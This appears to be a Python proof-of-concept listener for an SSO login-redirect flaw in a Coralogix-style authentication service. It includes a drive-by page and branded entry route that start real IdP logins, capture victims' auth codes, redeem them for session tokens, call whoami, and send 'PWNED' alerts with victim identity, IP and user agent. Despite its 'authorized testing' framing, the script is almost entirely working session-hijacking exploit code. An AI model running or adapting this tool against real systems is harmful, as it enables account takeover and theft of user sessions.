#!/usr/bin/env python3
"""Loopback listener for the ssologin redirect demo (F1/F2).

`serve` binds a tiny HTTP server on loopback, waits for the ACS redirect, then
redeems the `auth_code` at STS and proves the resulting session with
`GET /auth/v1/session`. `exchange` does the same for a code you already have,
without the listener.

Everything is written to a JSON capture file so the orchestrating script can
show the result. Use only against a test team in an environment you own.
"""

from __future__ import annotations

import argparse
import hashlib
import html
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timezone
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from string import Template

AUTH_CODE_COOKIE = "coralogix_auth_code"
GLOBAL_SESSION_COOKIE = "coralogix_global_session"
EXCHANGE_PATH = "/auth/v1/auth-code/exchange"
SESSION_PATH = "/auth/v1/session"
WHOAMI_PATH = "/auth/v1/whoami"
USER_AGENT = "cx-ssologin-demo/1.0 (authorized security testing)"
VIDEO_EMBED = (
    "https://www.youtube.com/embed/dQw4w9WgXcQ"
    "?autoplay=1&mute=1&rel=0&playsinline=1"
)

# The exchange response body carries the session JWT directly; the cookie is
# only a fallback for older behaviour.
def _session_token(headers, body: str) -> str | None:
    try:
        payload = json.loads(body)
    except ValueError:
        payload = None
    if isinstance(payload, dict):
        token = payload.get("global_session_token")
        if isinstance(token, str) and token:
            return token

    jar = SimpleCookie()
    for raw in (headers.get_all("Set-Cookie") if headers else None) or []:
        try:
            jar.load(raw)
        except Exception:  # noqa: BLE001 - malformed cookie is not fatal here
            continue
    morsel = jar.get(GLOBAL_SESSION_COOKIE)
    return morsel.value if morsel and morsel.value else None


def api_call(url: str, payload=None, extra_headers=None):
    data = None if payload is None else json.dumps(payload).encode("utf-8")
    request = urllib.request.Request(
        url, data=data, method="POST" if data is not None else "GET"
    )
    request.add_header("Accept", "application/json")
    request.add_header("User-Agent", USER_AGENT)
    if data is not None:
        request.add_header("Content-Type", "application/json")
    for name, value in (extra_headers or {}).items():
        request.add_header(name, value)
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            return response.status, response.headers, response.read().decode(
                "utf-8", "replace"
            )
    except urllib.error.HTTPError as exc:
        return exc.code, exc.headers, exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return 0, None, f"transport error: {exc.reason}"


def write_capture(path: str, payload: dict) -> None:
    """Write atomically, so a waiting reader never sees a partial file."""
    directory = os.path.dirname(os.path.abspath(path)) or "."
    os.makedirs(directory, exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=directory, prefix=".capture-")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2)
            handle.write("\n")
        os.chmod(tmp, 0o600)
        os.replace(tmp, path)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def _identity(result: dict):
    """Pull the attacker-visible identity out of a capture, without the token."""
    session = result.get("session")
    if not isinstance(session, dict):
        return None
    contexts = session.get("active_contexts") or []
    context = contexts[0] if contexts and isinstance(contexts[0], dict) else {}
    methods = [
        m.get("method") if isinstance(m, dict) else m
        for m in (context.get("login_methods") or [])
    ]
    identity = {
        "username": context.get("username"),
        "user_account_id": context.get("user_account_id"),
        "global_session_id": session.get("global_session_id"),
        "login_methods": methods,
        "mfa_verified": context.get("mfa_verified"),
        "login_flow_id": result.get("login_flow_id"),
        "received_at": result.get("received_at"),
        "via": result.get("via"),
    }
    team = session.get("team")
    if isinstance(team, dict):
        identity["team"] = {
            key: team.get(key) for key in ("team_id", "team_url", "team_name", "access")
        }
    return identity


def log_identity(result: dict, marker: str = "PWNED") -> None:
    identity = _identity(result)
    if identity:
        print(
            f"[listener] {marker} {json.dumps(identity, separators=(',', ':'))}",
            flush=True,
        )


def _run_agent_msg(command: list, environment: dict) -> None:
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=15,
            env=environment,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        print(f"[listener] ntfy failed: {exc}", flush=True)
        return

    output = (proc.stdout or proc.stderr or "").strip().replace("\n", " ")
    if proc.returncode == 0:
        print(f"[listener] ntfy sent: {output}", flush=True)
    else:
        print(f"[listener] ntfy failed ({proc.returncode}): {output}", flush=True)


def _send_ntfy(
    title: str, message: str, priority: str = "default", click: str | None = None
) -> None:
    """Publish through the agent-msg ntfy script, if enabled."""
    if os.environ.get("NTFY_NOTIFY") != "1":
        return

    binary = shutil.which("agent-msg")
    if not binary:
        print("[listener] ntfy skipped: agent-msg is not on PATH", flush=True)
        return

    command = [binary, "send", "-t", title, "-p", priority]
    if click:
        command += ["-u", click]
    command.append(message)

    environment = os.environ.copy()
    if not environment.get("NTFY_TOKEN_FILE") and environment.get(
        "CREDENTIALS_DIRECTORY"
    ):
        environment["NTFY_TOKEN_FILE"] = os.path.join(
            environment["CREDENTIALS_DIRECTORY"], "ntfy_agent_token"
        )

    # Do not hold up the HTTP response (the entry route must redirect fast).
    threading.Thread(
        target=_run_agent_msg, args=(command, environment), daemon=True
    ).start()


def notify(identity: dict) -> None:
    username = identity.get("username") or "unknown"
    lines = [
        f"SSO session captured for {username} "
        f"(user_account_id {identity.get('user_account_id')})"
    ]
    team = identity.get("team")
    if isinstance(team, dict):
        lines.append(
            f"team: {team.get('team_name')} ({team.get('team_url')}, "
            f"id {team.get('team_id')}), access={team.get('access')}"
        )
    lines.append(f"session: {identity.get('global_session_id')}")
    lines.append(f"flow: {identity.get('login_flow_id') or '-'}")

    click = os.environ.get("NTFY_CLICK_URL") or ""
    if click:
        flow = identity.get("login_flow_id")
        if flow and "login_flow_id=" not in click:
            separator = "&" if "?" in click else "?"
            click += f"{separator}login_flow_id={urllib.parse.quote(str(flow))}"
        lines.append(click)

    _send_ntfy(
        f"PWNED: {username}",
        "\n".join(lines),
        priority="high",
        click=click or None,
    )


def notify_link_opened(team: str, flow: str, host: str, ip: str, ua: str) -> None:
    message = (
        "ssologin link opened\n"
        f"team: {team}\n"
        f"host: {host}\n"
        f"flow: {flow}\n"
        f"ip: {ip or '-'}\n"
        f"ua: {ua or '-'}"
    )
    _send_ntfy("ssologin: link opened", message, priority="default")


def fetch_whoami(sts: str, token: str):
    """Call /auth/v1/whoami with the captured session, falling back to /session."""
    headers = {"Cookie": f"{GLOBAL_SESSION_COOKIE}={token}"}
    status, _, body = api_call(f"{sts}{WHOAMI_PATH}", extra_headers=headers)
    if status in (404, 405):
        status, _, body = api_call(f"{sts}{SESSION_PATH}", extra_headers=headers)
    try:
        return status, json.loads(body)
    except ValueError:
        return status, body


def redeem(sts: str, code: str, flow_id: str | None, out: str, source: dict) -> dict:
    sts = sts.rstrip("/")
    result = {
        "received_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "sts": sts,
        "auth_code_length": len(code),
        "login_flow_id": flow_id,
        **source,
    }

    headers = {"X-Login-Flow-Id": flow_id} if flow_id else None
    status, response_headers, body = api_call(
        f"{sts}{EXCHANGE_PATH}", {"auth_code": code}, headers
    )
    result["exchange_http_status"] = status
    try:
        result["exchange_body"] = json.loads(body)
    except ValueError:
        result["exchange_body"] = body

    token = _session_token(response_headers, body)
    if token:
        result["global_session_token"] = token
        whoami_status, whoami = fetch_whoami(sts, token)
        result["whoami_http_status"] = whoami_status
        result["whoami"] = whoami
        # Kept for the orchestrator / watcher, which read `.session`.
        result["session_http_status"] = whoami_status
        result["session"] = whoami

    if token:
        write_capture(out, result)
    else:
        # Never clobber a successful capture with a failed exchange (bots probe
        # the public callback with random codes).
        target = out if not os.path.exists(out) else f"{out}.error"
        write_capture(target, result)
    if token:
        print(
            f"[listener] session obtained (whoami HTTP {result['whoami_http_status']})",
            flush=True,
        )
        identity = _identity(result)
        if identity:
            print(
                f"[listener] PWNED {json.dumps(identity, separators=(',', ':'))}",
                flush=True,
            )
            notify(identity)
    else:
        print(
            f"[listener] exchange failed: HTTP {status} - see capture file", flush=True
        )
    return result


DRIVE_BY_PAGE = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in</title>
<style>
  body { margin: 0; font-family: system-ui, sans-serif; background: #0b0d12; color: #e6e8ee;
         display: grid; place-items: center; min-height: 100vh; }
  .box { text-align: center; }
  h1 { font-size: 22px; font-weight: 600; }
  p { color: #8b95a5; }
</style>
</head>
<body>
<div class="box">
  <h1>Redirecting to SSO&hellip;</h1>
  <p id="status">Starting the login flow.</p>
</div>
<script>
  // PoC: the ssologin endpoint reflects any Origin in CORS, and the browser
  // sends this page's Origin. The backend resolves the team from that Origin
  // and puts it into RelayState, so the ACS returns the auth code here.
  var api = "__API__";
  fetch(api + "/v2/saml/ssologin", { credentials: "omit", cache: "no-store" })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (!d.login_url) throw new Error(JSON.stringify(d));
      location.replace(d.login_url);
    })
    .catch(function (e) {
      document.getElementById("status").textContent = "failed: " + e;
    });
</script>
</body>
</html>
"""


CAPTURE_PAGE = Template(
    """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>session captured — $username</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin: 0; font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
         background: #0b0d12; color: #e6e8ee; }
  .wrap { max-width: 980px; margin: 0 auto; padding: 36px 20px 72px; }
  .banner { font-size: 12px; letter-spacing: .14em; text-transform: uppercase; color: #7ee787; }
  h1 { margin: 8px 0 6px; font-size: 42px; line-height: 1.1; }
  h2 { margin: 36px 0 10px; font-size: 16px; color: #c9d1d9; font-weight: 600; }
  .who { color: #9aa4b2; margin: 0 0 24px; font-size: 16px; line-height: 1.5; }
  code { color: #d2a8ff; }
  .video { position: relative; aspect-ratio: 16 / 9; margin: 24px 0 8px;
           border-radius: 14px; overflow: hidden; box-shadow: 0 18px 50px #0009; }
  iframe { width: 100%; height: 100%; border: 0; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
          gap: 12px; margin-top: 24px; }
  .card { background: #141821; border: 1px solid #232a36; border-radius: 10px; padding: 14px 16px; }
  .k { font-size: 11px; color: #8b95a5; text-transform: uppercase; letter-spacing: .1em; }
  .v { font-size: 17px; margin-top: 5px; word-break: break-all; }
  pre { background: #0f131b; border: 1px solid #232a36; border-radius: 10px;
        padding: 16px; overflow: auto; font-size: 12px; line-height: 1.5; color: #c9d1d9; }
  .note { color: #8b95a5; font-size: 13px; margin-top: 14px; }
</style>
</head>
<body>
<div class="wrap">
  <div class="banner">authorized security demo · ssologin redirect</div>
  <h1>Session captured</h1>
  <p class="who">Authenticated as <strong>$username</strong>. The auth code was redeemed at
    STS and <code>/auth/v1/whoami</code> was called server-side with the resulting session
    cookie.</p>

  <div class="video">
    <iframe src="$video" title="Never Gonna Give You Up"
            allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>
  </div>
  <p class="note">Autoplay is muted by browser policy — unmute in the player.</p>

  <div class="grid">
    <div class="card"><div class="k">username</div><div class="v">$username</div></div>
    <div class="card"><div class="k">user_account_id</div><div class="v">$user_id</div></div>
    <div class="card"><div class="k">global_session_id</div><div class="v">$session_id</div></div>
    <div class="card"><div class="k">session</div><div class="v">active=$active · expires_in=${expires}s</div></div>
    <div class="card"><div class="k">login method</div><div class="v">$methods</div></div>
    <div class="card"><div class="k">mfa_verified</div><div class="v">$mfa</div></div>
    $team_card
  </div>

  <h2>whoami (HTTP $whoami_status)</h2>
  <pre>$pretty</pre>
  <p class="note">The raw session token is not rendered here; it is written to the
    server-side capture file only. Delete it when the demo ends.</p>
</div>
</body>
</html>
"""
)


def _redacted(payload):
    if isinstance(payload, dict):
        return {k: v for k, v in payload.items() if k != "global_session_token"}
    return payload


def render_page(result: dict) -> str:
    session = result.get("session")
    if not isinstance(session, dict) or not session.get("active"):
        detail = json.dumps(
            result.get("exchange_body") or result, indent=2, default=str
        )
        return (
            "<!doctype html><meta charset=utf-8><title>capture failed</title>"
            "<body style='background:#0b0d12;color:#e6e8ee;font-family:system-ui;padding:40px'>"
            "<h1>No session</h1>"
            f"<p>Exchange HTTP {html.escape(str(result.get('exchange_http_status')))}"
            f", whoami HTTP {html.escape(str(result.get('whoami_http_status')))}</p>"
            f"<pre style='white-space:pre-wrap'>{html.escape(detail)}</pre>"
            "</body>"
        )

    contexts = session.get("active_contexts") or []
    context = contexts[0] if contexts and isinstance(contexts[0], dict) else {}
    methods = (
        ", ".join(
            str(m.get("method")) if isinstance(m, dict) else str(m)
            for m in (context.get("login_methods") or [])
        )
        or "-"
    )
    team = session.get("team")
    team_card = ""
    if isinstance(team, dict):
        team_card = (
            '<div class="card"><div class="k">team</div><div class="v">'
            f"{html.escape(str(team.get('team_name', '?')))} "
            f"({html.escape(str(team.get('team_url', '?')))} · "
            f"id {html.escape(str(team.get('team_id', '?')))}) · "
            f"access={html.escape(str(team.get('access')))}</div></div>"
        )

    return CAPTURE_PAGE.substitute(
        video=VIDEO_EMBED,
        username=html.escape(str(context.get("username", "unknown"))),
        user_id=html.escape(str(context.get("user_account_id", "-"))),
        session_id=html.escape(str(session.get("global_session_id", "-"))),
        active=html.escape(str(session.get("active"))),
        expires=html.escape(str(session.get("expires_in", "-"))),
        methods=html.escape(methods),
        mfa=html.escape(str(context.get("mfa_verified", "-"))),
        team_card=team_card,
        whoami_status=html.escape(str(result.get("whoami_http_status", "-"))),
        pretty=html.escape(json.dumps(_redacted(session), indent=2, default=str)),
    )


class CaptureHandler(BaseHTTPRequestHandler):
    server_version = "ssologin-demo"
    protocol_version = "HTTP/1.1"

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        self._handle()

    def do_POST(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        self._handle()

    def _respond(self, status: int, body: str, content_type: str) -> None:
        encoded = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(encoded)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(encoded)

    def _redirect(self, location: str) -> None:
        self.send_response(302)
        self.send_header("Location", location)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _start_sso(self, params, team_override=None, origin_override=None) -> None:
        """Mint a real IdP login link and redirect to it.

        Served at /login/select-provider (and /sso) so the link we hand out is
        an SSO entry URL instead of the long Okta SAML assertion URL. The Origin
        is the request host (team slug first label) unless an `origin` parameter
        supplies the legitimate dashboard, in which case redirectUrl is set.
        The brand-host entry route passes both overrides with the legitimate
        dashboard origin and the request host as redirectUrl.
        """
        config = self.server.config  # type: ignore[attr-defined]
        host = (self.headers.get("host") or "").strip()
        if not host:
            self._respond(400, "missing Host header\n", "text/plain")
            return
        if not (
            team_override
            or params.get("team_url")
            or params.get("login_flow_id")
            or params.get("flow")
        ):
            self._respond(
                400, "team_url, login_flow_id or flow is required\n", "text/plain"
            )
            return
        scheme = (self.headers.get("x-forwarded-proto") or "https").split(",")[0].strip()
        base = f"{scheme}://{host}"
        requested_flow = (
            (params.get("login_flow_id") or params.get("flow") or [None])[0]
        )
        team = (
            team_override
            or (params.get("team_url") or [None])[0]
            or host.split(".")[0]
        )
        flow = requested_flow or str(uuid.uuid4())
        origin = (params.get("origin") or [None])[0] or origin_override or base

        if requested_flow:
            self._notify_link_once(requested_flow, team, host)

        query = ""
        if origin != base:
            query = "?" + urllib.parse.urlencode({"redirectUrl": base})

        status, _, body = api_call(
            f"{config['sts']}/v2/saml/ssologin{query}",
            extra_headers={"Origin": origin, "X-Login-Flow-Id": flow},
        )
        login_url = None
        try:
            payload = json.loads(body)
            if isinstance(payload, dict):
                login_url = payload.get("login_url")
        except ValueError:
            pass
        print(
            f"[listener] sso entry team={team} origin={origin} flow={flow} "
            f"status={status} -> {'idp' if login_url else 'no login_url'}",
            flush=True,
        )
        if login_url:
            self._redirect(login_url)
        else:
            self._respond(
                status if 400 <= status < 600 else 502,
                f"<pre>{html.escape(body)}</pre>",
                "text/html; charset=utf-8",
            )

    def _notify_link_once(self, flow: str, team: str, host: str) -> None:
        server = self.server
        with server.lock:  # type: ignore[attr-defined]
            if flow in server.notified:  # type: ignore[attr-defined]
                return
            if len(server.notified) > 1000:  # type: ignore[attr-defined]
                server.notified.clear()  # type: ignore[attr-defined]
            server.notified.add(flow)  # type: ignore[attr-defined]

        forwarded = self.headers.get("x-forwarded-for") or self.headers.get(
            "x-real-ip"
        )
        ip = (forwarded or self.client_address[0]).split(",")[0].strip()
        user_agent = self.headers.get("user-agent") or ""
        notify_link_opened(team, flow, host, ip, user_agent)

    def _handle(self) -> None:
        config = self.server.config  # type: ignore[attr-defined]
        parsed = urllib.parse.urlsplit(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        path = parsed.path.rstrip("/")
        entry_team = config.get("entry_team")
        entry_flow = params.get("flow") or params.get("login_flow_id")

        # Brand-host entry: mint server-side with the legitimate dashboard
        # Origin and this host as redirectUrl, then redirect to the IdP.
        if path in ("", "/login") and entry_team and entry_flow:
            dashboard = config.get(
                "entry_dashboard_format", "https://{team}.app.eu2.coralogix.com"
            ).replace("{team}", entry_team)
            self._start_sso(
                params, team_override=entry_team, origin_override=dashboard
            )
            return

        if path in ("", "/healthz") and "auth_code" not in params:
            self._respond(200, "ssologin demo listener is up\n", "text/plain")
            return

        if path == "/cors" or (path == "/login" and not entry_team):
            self._respond(
                200,
                DRIVE_BY_PAGE.replace("__API__", config["sts"]),
                "text/html; charset=utf-8",
            )
            return

        if path in ("/login/select-provider", "/sso"):
            self._start_sso(params)
            return

        code = (params.get("auth_code") or [None])[0]
        if not code:
            self._respond(404, "waiting for an auth_code query parameter\n", "text/plain")
            return

        flow_id = (params.get("login_flow_id") or [None])[0]
        # Deduplicate by code, not globally: every new victim/code is processed.
        fingerprint = hashlib.sha256(code.encode("utf-8")).hexdigest()
        with self.server.lock:  # type: ignore[attr-defined]
            if fingerprint in self.server.captured_codes:  # type: ignore[attr-defined]
                self._respond(200, "auth_code already captured\n", "text/plain")
                return
            if len(self.server.captured_codes) > 1000:  # type: ignore[attr-defined]
                self.server.captured_codes.clear()  # type: ignore[attr-defined]
            self.server.captured_codes.add(fingerprint)  # type: ignore[attr-defined]

        print(
            f"[listener] auth_code received on {parsed.path} "
            f"({len(code)} chars, login_flow_id={flow_id or '-'})",
            flush=True,
        )
        try:
            result = redeem(
                config["sts"],
                code,
                flow_id,
                config["out"],
                {"path": parsed.path, "via": "acs-redirect"},
            )
        except Exception as exc:  # noqa: BLE001 - always leave a capture file
            result = {
                "received_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "sts": config["sts"],
                "auth_code_length": len(code),
                "login_flow_id": flow_id,
                "path": parsed.path,
                "via": "acs-redirect",
                "error": f"{type(exc).__name__}: {exc}",
            }
            write_capture(
                config["out"]
                if not os.path.exists(config["out"])
                else f"{config['out']}.error",
                result,
            )
            print(f"[listener] error while redeeming: {exc}", flush=True)

        if not result.get("global_session_token"):
            # Transient failures should not burn the code; allow a retry.
            with self.server.lock:  # type: ignore[attr-defined]
                self.server.captured_codes.discard(fingerprint)  # type: ignore[attr-defined]

        self._respond(200, render_page(result), "text/html; charset=utf-8")

    def log_message(self, fmt: str, *args) -> None:
        # The host is public, so bots probe it constantly. Only log the requests
        # that actually carry a code; captures also print their own PWNED line.
        if "auth_code=" in self.path:
            sys.stderr.write(f"[http] {self.address_string()} {fmt % args}\n")
            sys.stderr.flush()


def cmd_serve(args) -> int:
    loopback = args.bind in ("127.0.0.1", "::1", "localhost")
    if not loopback and not args.allow_non_loopback:
        print(
            f"refusing to bind {args.bind}: this demo listener must stay on loopback "
            "(pass --allow-non-loopback only if nginx runs in another namespace)",
            file=sys.stderr,
        )
        return 2
    if not loopback:
        print(
            f"[listener] WARNING: binding {args.bind}; anyone who can reach it can "
            "deliver an auth code to it",
            file=sys.stderr,
            flush=True,
        )

    server = ThreadingHTTPServer((args.bind, args.port), CaptureHandler)
    server.config = {  # type: ignore[attr-defined]
        "sts": args.sts.rstrip("/"),
        "out": os.path.abspath(args.out),
        "entry_team": args.entry_team,
        "entry_dashboard_format": args.entry_dashboard_format,
    }
    server.captured_codes = set()  # type: ignore[attr-defined]
    server.lock = threading.Lock()  # type: ignore[attr-defined]
    server.notified = set()  # type: ignore[attr-defined]

    host, port = server.server_address[:2]
    print(f"[listener] serving on http://{host}:{port}", flush=True)
    print(f"[listener] exchange base {args.sts.rstrip('/')}", flush=True)
    if args.entry_team:
        print(
            f"[listener] brand entry team={args.entry_team} "
            f"dashboard={args.entry_dashboard_format}",
            flush=True,
        )

    # Make the last capture visible in the journal after a restart/redeploy.
    if os.path.exists(args.out):
        try:
            with open(args.out, encoding="utf-8") as handle:
                log_identity(json.load(handle), marker="PREVIOUS")
        except (OSError, ValueError):
            pass
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    return 0


def cmd_exchange(args) -> int:
    code = args.code
    flow_id = args.flow_id
    source = {"via": "manual"}
    if args.acs_url:
        parsed = urllib.parse.urlsplit(args.acs_url)
        params = urllib.parse.parse_qs(parsed.query)
        code = (params.get("auth_code") or [None])[0]
        flow_id = flow_id or (params.get("login_flow_id") or [None])[0]
        source = {"via": "acs-url", "acs_url": args.acs_url}
    if not code:
        print("no auth_code found", file=sys.stderr)
        return 2
    result = redeem(args.sts, code, flow_id, os.path.abspath(args.out), source)
    return 0 if result.get("global_session_token") else 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="command", required=True)

    serve = sub.add_parser("serve", help="listen for the ACS redirect")
    serve.add_argument("--bind", default="127.0.0.1")
    serve.add_argument("--port", type=int, default=8776)
    serve.add_argument(
        "--allow-non-loopback",
        action="store_true",
        help="allow binding a non-loopback address (only for a containerised nginx)",
    )
    serve.add_argument("--sts", required=True, help="STS base URL, e.g. $API")
    serve.add_argument("--out", required=True, help="capture JSON path")
    serve.add_argument(
        "--entry-team",
        default="",
        help="team slug for the brand-host entry route (empty disables it)",
    )
    serve.add_argument(
        "--entry-dashboard-format",
        default="https://{team}.app.eu2.coralogix.com",
        help="legitimate dashboard origin used by the brand-host entry route",
    )
    serve.set_defaults(func=cmd_serve)

    exchange = sub.add_parser("exchange", help="redeem a code you already have")
    exchange.add_argument("--sts", required=True)
    exchange.add_argument("--out", required=True)
    exchange.add_argument("--code")
    exchange.add_argument("--acs-url", help="a /login/sso?auth_code=... URL")
    exchange.add_argument("--flow-id")
    exchange.set_defaults(func=cmd_exchange)

    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
